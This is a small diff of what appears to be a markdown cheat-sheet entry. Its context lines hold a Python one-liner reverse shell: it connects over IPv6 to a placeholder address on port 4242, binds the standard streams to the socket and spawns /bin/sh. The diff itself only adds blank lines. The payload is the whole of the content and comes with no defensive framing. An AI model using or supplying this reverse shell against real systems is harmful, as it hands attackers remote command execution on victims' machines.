@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:25:25.998104+00:00'
 ```python
 python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
 ```
+
+
